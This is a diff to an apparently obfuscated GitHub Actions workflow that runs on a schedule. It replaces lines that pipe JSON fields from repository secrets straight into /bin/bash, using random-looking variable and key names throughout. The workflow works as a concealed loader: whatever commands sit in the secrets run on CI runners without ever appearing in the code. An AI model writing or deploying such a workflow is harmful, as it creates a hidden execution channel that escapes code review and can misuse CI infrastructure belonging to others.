@@ -1,8 +1,10 @@
 name: hantao19871010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 2/6 * * *'
+    - cron: '26 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,16 +12,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: hantao19871010
         env:
-          abkb26: ${{ secrets.abkb26 }}
+          ak80446: ${{ secrets.ak80446 }}
         run: |
-          echo $abkb26 | jq -r .my22870 | /bin/bash
-          echo $sau6 | jq -r .fmdde9 | /bin/bash
-          echo $scncn95 | jq -r .tp19564 | /bin/bash
-          echo $rxdrk83782 | jq -r .vg59407 | /bin/bash
-          echo $f70824 | jq -r .yxxk7 | /bin/bash
-          echo $d7378 | jq -r .dmsj69443 | /bin/bash
-          echo $rbjzm170 | jq -r .jwbv52 | /bin/bash
-          echo $xjrst516 | jq -r .dym43501 | /bin/bash
-          echo $omi92 | jq -r .bkq30284 | /bin/bash
-          echo $uhfmn62287 | jq -r .slz8 | /bin/bash
+          echo $ak80446 | jq -r .w097 | /bin/bash
+          echo $tghr1 | jq -r .v49849 | /bin/bash
+          echo $hbxq138 | jq -r .srpp8 | /bin/bash
+          echo $zbnsc6504 | jq -r .ngf68617 | /bin/bash
+          echo $pi7 | jq -r .sek6 | /bin/bash
+          echo $gdw8599 | jq -r .wvt1212 | /bin/bash
 
